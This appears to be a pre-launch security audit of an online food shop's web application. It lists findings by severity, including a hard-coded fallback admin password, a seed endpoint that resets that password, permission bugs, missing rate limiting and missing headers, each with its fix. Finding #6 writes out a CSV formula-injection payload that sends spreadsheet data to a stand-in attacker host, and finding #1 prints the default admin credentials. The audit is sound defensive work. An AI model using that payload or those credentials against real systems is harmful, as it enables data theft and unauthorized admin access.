# Security Audit — Pre-Launch Checklist

Full-application security review conducted 2026-08-15, before going live.
Two passes were run: (1) a diff-only review of the then-pending PR #10
changes, which came back clean, and (2) a full-codebase audit covering
auth, admin authorization, customer-facing APIs, injection surfaces,
secrets, and dependencies. This file tracks the findings from pass (2) so
they can all be reviewed and fixed together in one batch before launch,
instead of one at a time.

**Status: 1 of 6 findings closed (see #5). Review and action the rest before go-live.**

## Overall verdict

Customer data is mostly safe. Checkout pricing/stock/coupons are always
recalculated server-side (a customer can't fake a price), there is no SQL
injection anywhere in the codebase, no payment card data is ever stored
(COD / manual-card only), passwords are bcrypt-hashed, and `npm audit
--production` reports 0 vulnerabilities. Six concrete issues were found,
two of them High severity and worth fixing before launch specifically.

---

## High severity

### 1. Hard-coded fallback admin password
- **File:** `src/app/api/seed/route.ts:21`, `prisma/seed.ts:10`
- **Issue:** `const adminPassword = process.env.ADMIN_PASSWORD ?? "kunfoods123";`
  If `ADMIN_PASSWORD` is ever left unset in the deploy environment, the
  seed routine creates/repairs the `admin@kunfoods.com` account with the
  publicly-known password `kunfoods123`, taken straight from the source.
- **Exploit scenario:** Anyone who reads the repo knows the fallback
  password. If a deploy is done without setting `ADMIN_PASSWORD`, an
  attacker logs into `/admin/login` as `admin@kunfoods.com` /
  `kunfoods123` and gets full super-admin access to every order, customer
  record, and CSV export.
- **Action item:** Verify `ADMIN_PASSWORD` is actually set in the Vercel
  production environment right now. Then remove the hard-coded fallback so
  the seed/build fails loudly instead of silently defaulting.

### 2. `/api/seed` reuses `AUTH_SECRET`, resets the admin password on every call
- **File:** `src/app/api/seed/route.ts:16-26`
- **Issue:** The endpoint gates a data-mutating GET request by comparing
  `key !== process.env.AUTH_SECRET` — the same secret NextAuth uses to
  sign admin session JWTs — using a plain (non-timing-safe) `!==`. Because
  the admin upsert always runs `update: { passwordHash }`, every
  successful call **resets the admin password back to
  `ADMIN_PASSWORD`/`kunfoods123`**, making this a repeatable backdoor once
  the key is known.
- **Exploit scenario:** If `AUTH_SECRET` ever leaks (logs, misconfigured
  proxy, a left-in default), an attacker calls `/api/seed?key=<secret>` to
  force-reset the admin password to a known value, then logs in as admin.
- **Action item:** Use a separate, dedicated setup key (not `AUTH_SECRET`);
  compare with `crypto.timingSafeEqual`; stop overwriting an existing
  admin's password on repeat calls; consider removing the endpoint
  entirely once initial deploy/seeding is done.

---

## Medium severity

### 3. Order status changes gated by the wrong permission
- **File:** `src/app/admin/(dashboard)/actions.ts:254-255`
- **Issue:** `updateOrderStatus` (can cancel any order) is gated with
  `requirePermission("products.manage")` instead of an orders permission.
  `bulkSetOrderStatus` in `orders/bulk-actions.ts:33` correctly uses
  `requirePermission("orders.edit")`, confirming this is a bug.
- **Exploit scenario:** The `inventory_manager` role has `products.manage`
  but no orders access. That staff member can't see the Orders page in the
  UI, but can still directly call this server action to silently change
  or cancel any customer's order.
- **Action item:** Change the check to `requirePermission("orders.edit")`.

### 4. Route prefix collision exposes warehouse records to confined staff
- **File:** `src/proxy.ts:9-26`, `src/app/admin/(dashboard)/warehouses/[id]/edit/page.tsx`
- **Issue:** `/admin/warehouse*` matching via `startsWith` means the
  singular pick-and-pack route (`/admin/warehouse`) prefix-collides with
  the plural warehouse-management section (`/admin/warehouses`). Picker/
  packer roles, meant to be confined to the former, pass the check for the
  latter too. The edit page itself has no permission check of its own.
- **Exploit scenario:** A picker/packer navigates to
  `/admin/warehouses/<id>/edit` and can view (not edit — the server action
  still re-checks permissions) any warehouse's name/code/city/address.
  View-only; no customer PII is on the Warehouse model.
- **Action item:** Add an explicit `/admin/warehouses` entry to
  `ROUTE_PERMISSIONS`, and add `requirePermission("warehouses.manage")`
  directly to `warehouses/new/page.tsx` and `warehouses/[id]/edit/page.tsx`
  as defense in depth.

### 5. Unescaped customer name/fields in notification emails (HTML injection) — CLOSED
- **File:** `src/lib/notifications.ts:60-67`, `:110-116`
- **Issue:** `customerName`/`email`/`phone`/item names are interpolated
  directly into raw HTML email bodies with no escaping before being sent
  via Resend.
- **Exploit scenario:** A shopper checks out with a name containing an
  `<a href="...">`/`<img>` tag. It renders as live markup in the "New
  order from …" email sent to `ADMIN_NOTIFICATION_EMAIL` and in the
  customer's own confirmation email — a phishing/tracking vector.
- **Status:** Closed at the source rather than by escaping the email HTML —
  `customerName` is now restricted to letters and spaces only, both
  client- and server-side (`src/lib/name.ts`, wired into `/api/orders`
  and the POS order action), so it can no longer carry `<`, `>`, `=`, or
  any other markup-breaking character. `email` and `phone` were already
  safe (zod's email format and `pakistaniMobileSchema`'s digit-only
  normalization can't carry HTML either), and item names come from
  admin-created products, not customer input. No remaining attacker-
  controlled field reaches these email templates un-validated.

### 6. CSV formula injection in customer/order exports — PARTIALLY MITIGATED
- **File:** `src/lib/csv.ts:1-6` (`escapeCsvField`)
- **Issue:** Only quotes/commas/newlines are escaped — a leading `=`, `+`,
  `-`, or `@` (spreadsheet formula triggers) is not neutralized.
- **Exploit scenario:** A shopper checks out with a name like
  `=HYPERLINK("http://evil.example/steal?d="&A1,"Track package")`. When an
  admin exports and opens the CSV in Excel, the formula can execute and
  leak spreadsheet contents.
- **Status:** The `customerName` vector in this exact scenario is now
  closed (letters/spaces only, same fix as #5 above). Other free-text
  order fields exported to CSV — `address` in particular — are still
  unrestricted and could carry a formula-injection payload, so the
  underlying `escapeCsvField` fix below is still worth doing.
- **Action item:** Prefix any field starting with `=`, `+`, `-`, `@`, tab,
  or CR with a leading apostrophe before quoting, in `escapeCsvField`.

---

## Low severity

### 7. No rate limiting on public order tracking
- **File:** `src/app/api/orders/track/route.ts`, `src/lib/format.ts:18-24`
- **Issue:** Order numbers are `KF{yy}{mm}-{4-digit random}` (~9,000
  possibilities/month); `/api/orders/track` is public, unauthenticated,
  and unthrottled.
- **Exploit scenario:** Someone who already knows a target's email can
  brute-force the order number for a given month to retrieve that
  customer's name, phone, address, and order contents. Requires knowing
  the victim's email first — not a wide-open PII dump, but unthrottled.
- **Action item:** Add rate limiting (IP and/or email-based) to
  `/api/orders/track` and `/admin/login`.

### 8. No security headers
- **File:** `next.config.ts`, `src/proxy.ts`
- **Issue:** No CSP, X-Frame-Options, or HSTS anywhere, including on
  `/admin/login` — permits framing the admin panel (clickjacking/UI
  redress against an already-authenticated admin).
- **Action item:** Add `X-Frame-Options: DENY` (or `frame-ancestors
  'none'`) at least on `/admin/*`, plus a baseline CSP and HSTS.

---

## Confirmed clean (no action needed)

- Checkout pricing/stock/coupons always recomputed server-side, both for
  storefront `/api/orders` and POS `createPosOrder`.
- No `$queryRaw`/`$executeRaw`/`$queryRawUnsafe`/`$executeRawUnsafe`
  anywhere in the codebase — all DB access via Prisma's parameterized
  query builder.
- No `eval`/`Function`/`child_process` usage.
- Only one `dangerouslySetInnerHTML` in the app (admin template-editor
  previewing the admin's own typed text) — not exploitable against
  another user.
- Passwords bcrypt-hashed (cost factor 10), no plaintext/weak hashing.
- No user enumeration on admin login (generic error message either way).
- Every mutating admin server action and `/api/admin/**` /
  `/api/warehouse/**` route calls a permission check before touching the
  DB, except Finding #3 above.
- No payment card fields exist on the `Payment` model at all — nothing to
  leak.
- `.env` gitignored correctly, `.env.example` has only placeholders, no
  real secrets found committed anywhere in the repo.
- `npm audit --production`: 0 vulnerabilities.
- No incoming webhook receivers to worry about forged callbacks — only
  outgoing, HMAC-SHA256-signed webhooks.
